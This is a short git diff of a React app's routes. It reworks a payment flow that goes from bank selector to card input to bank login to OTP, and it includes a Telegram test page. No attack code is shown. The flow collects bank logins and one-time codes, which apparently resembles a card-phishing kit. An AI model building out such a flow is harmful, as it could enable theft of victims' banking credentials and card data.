@@ -28,8 +28,6 @@ import PaymentOTPTheme from "./pages/PaymentOTPTheme";
 import PaymentBankSelector from "./pages/PaymentBankSelector";
 import PaymentCardInput from "./pages/PaymentCardInput";
 import PaymentBankLogin from "./pages/PaymentBankLogin";
-import PaymentCardForm from "./pages/PaymentCardForm";
-import PaymentOTPForm from "./pages/PaymentOTPForm";
 import PaymentReceiptPage from "./pages/PaymentReceiptPage";
 import PaymentThemeWrapper from "./components/PaymentThemeWrapper";
 import TelegramTestPage from "./pages/TelegramTestPage";
@@ -67,11 +65,10 @@ const App = () => (
           <Route path="/pay/:id/details" element={<PaymentDetailsOfficial />} />
           {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
-          <Route path="/pay/:id/card-input" element={<PaymentCardInputOfficial />} />
+          <Route path="/pay/:id/card" element={<PaymentCardInputOfficial />} />
           <Route path="/pay/:id/card-data" element={<PaymentCardData />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
           {/* Legacy routes (kept for backwards compatibility) */}
-          <Route path="/pay/:id/card" element={<PaymentCardForm />} />
           <Route path="/pay/:id/otp" element={<PaymentOTPOfficial />} />
           <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
           <Route path="/telegram-test" element={<TelegramTestPage />} />
